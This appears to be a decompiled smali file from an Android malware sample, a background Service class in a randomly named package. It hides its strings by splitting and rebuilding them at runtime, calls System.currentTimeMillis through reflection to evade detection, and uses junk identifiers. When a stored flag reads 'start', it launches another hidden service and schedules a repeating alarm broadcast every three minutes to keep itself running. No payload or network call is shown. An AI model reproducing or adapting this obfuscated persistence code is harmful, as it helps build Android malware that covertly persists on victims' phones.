.class public Lsojgp/zdga/pwrjbzetltzu/MyService;
.super Landroid/app/Service;
.source "MyService.java"


# instance fields
.field private Bisnutirkis:Lsojgp/zdga/pwrjbzetltzu/TwisterNet;

.field private alarmMgr:Landroid/app/AlarmManager;

.field fdgdfhgd:Ljava/lang/String;

.field private intent:Landroid/content/Intent;

.field private pi:Landroid/app/PendingIntent;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 17
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 21
    const-string v0, "tTimeM"

    iput-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->fdgdfhgd:Ljava/lang/String;

    .line 17
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 25
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 11

    .prologue
    .line 30
    new-instance v7, Lsojgp/zdga/pwrjbzetltzu/TwisterNet;

    const-string v8, "time"

    const-string v9, "null"

    invoke-direct {v7, p0, v8, v9}, Lsojgp/zdga/pwrjbzetltzu/TwisterNet;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iput-object v7, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->Bisnutirkis:Lsojgp/zdga/pwrjbzetltzu/TwisterNet;

    .line 31
    const-string v0, "ste"

    .line 32
    .local v0, "dfd":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "sy"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "ma"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {p0, v7, v8}, Lsojgp/zdga/pwrjbzetltzu/MyService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 33
    .local v4, "polzovatelDannie":Landroid/content/SharedPreferences;
    new-instance v5, Lsojgp/zdga/pwrjbzetltzu/PiratusKin;

    invoke-direct {v5}, Lsojgp/zdga/pwrjbzetltzu/PiratusKin;-><init>()V

    .line 34
    .local v5, "putt2":Lsojgp/zdga/pwrjbzetltzu/PiratusKin;
    const-string v3, "st"

    .line 35
    .local v3, "fdsfsdfds":Ljava/lang/String;
    const-string v1, "ar"

    .line 36
    .local v1, "dfsdfsd":Ljava/lang/String;
    const-string v7, "getString"

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "st"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "t"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "pu"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "o"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v4, v7, v8, v9}, Lsojgp/zdga/pwrjbzetltzu/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 38
    .local v6, "start":Ljava/lang/String;
    const-string v2, "ar"

    .line 39
    .local v2, "dsfdfd":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "st"

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "t"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 40
    new-instance v7, Landroid/content/Intent;

    const-class v8, Lsojgp/zdga/pwrjbzetltzu/EtroDetra;

    invoke-direct {v7, p0, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v7}, Lsojgp/zdga/pwrjbzetltzu/MyService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 41
    invoke-virtual {p0, p0}, Lsojgp/zdga/pwrjbzetltzu/MyService;->set_alarm(Landroid/content/Context;)V

    .line 44
    :cond_0
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 71
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 72
    const-string v0, "Test"

    const-string v1, "Service: onDestroy"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 64
    new-instance v0, Lsojgp/zdga/pwrjbzetltzu/TwisterNet;

    const-string v1, "time2"

    const-string v2, "null"

    invoke-direct {v0, p0, v1, v2}, Lsojgp/zdga/pwrjbzetltzu/TwisterNet;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iput-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->Bisnutirkis:Lsojgp/zdga/pwrjbzetltzu/TwisterNet;

    .line 65
    const-string v0, "Test"

    const-string v1, "Service: onStartCommand"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 66
    const/4 v0, 0x1

    return v0
.end method

.method public onTaskRemoved(Landroid/content/Intent;)V
    .locals 2
    .param p1, "rootIntent"    # Landroid/content/Intent;

    .prologue
    .line 77
    const-string v0, "Test"

    const-string v1, "Service: onTaskRemoved"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 78
    return-void
.end method

.method public set_alarm(Landroid/content/Context;)V
    .locals 10
    .param p1, "ctx"    # Landroid/content/Context;

    .prologue
    const-wide/32 v4, 0x2bf20

    const/4 v1, 0x0

    .line 47
    const-wide/16 v8, 0x0

    .line 49
    .local v8, "fdfd":J
    :try_start_0
    const-string v0, "java.lang.System"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "curren"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v7, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->fdgdfhgd:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "illis"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    new-array v7, v7, [Ljava/lang/Class;

    invoke-virtual {v0, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v6, 0x0

    const/4 v7, 0x0

    new-array v7, v7, [Ljava/lang/Object;

    invoke-virtual {v0, v6, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Long;

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    move-result-wide v8

    .line 54
    :goto_0
    const-string v0, "alarm"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iput-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->alarmMgr:Landroid/app/AlarmManager;

    .line 55
    new-instance v0, Landroid/content/Intent;

    const-class v6, Lsojgp/zdga/pwrjbzetltzu/AsooLeert;

    invoke-direct {v0, p1, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->intent:Landroid/content/Intent;

    .line 56
    iget-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->intent:Landroid/content/Intent;

    invoke-static {p1, v1, v0, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->pi:Landroid/app/PendingIntent;

    .line 57
    add-long v2, v8, v4

    .line 58
    .local v2, "thirtySecondsFromNow":J
    iget-object v0, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->alarmMgr:Landroid/app/AlarmManager;

    iget-object v6, p0, Lsojgp/zdga/pwrjbzetltzu/MyService;->pi:Landroid/app/PendingIntent;

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    .line 61
    return-void

    .line 51
    .end local v2    # "thirtySecondsFromNow":J
    :catch_0
    move-exception v0

    goto :goto_0
.end method
